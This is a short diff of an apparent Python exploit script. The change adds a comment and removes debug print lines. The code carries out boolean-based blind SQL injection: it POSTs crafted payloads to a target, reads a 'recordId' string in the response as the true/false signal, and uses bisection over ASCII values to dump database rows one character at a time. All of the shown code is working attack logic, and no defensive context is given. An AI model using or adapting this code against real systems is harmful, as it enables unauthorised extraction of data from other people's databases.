@@ -8,14 +8,13 @@ def sqli(inj_str):
     max = end = 125
 
     for j in range(1,100): #Loop over ASCII values
+        #Applying bisection search algorithm
         for op in [">","<","="]:
             g = (min+max)/2 #median of the 2 values
             inj = inj_str.replace("[CHAR]", op+str(g))
             data = entry_point.replace("[INJ]", inj)
-            #print(data)
             r = requests.post(target, data=data, headers=headers)
             if ("recordId" in r.text):
-                #print("TRUE CONDITION!")
                 if op == ">": min = g
                 elif op == "<": max = g
                 elif op == "=": return int(g)
@@ -27,7 +26,6 @@ def dumpRow(inj_str):
     output = ''
     for i in range(1, 1000): #Loop over characters
         inj = inj_str.replace("[POS]", str(i))
-        #print("\n" + inj)
         extracted_char = sqli(inj)
         if extracted_char:
             extracted_char = chr(extracted_char)
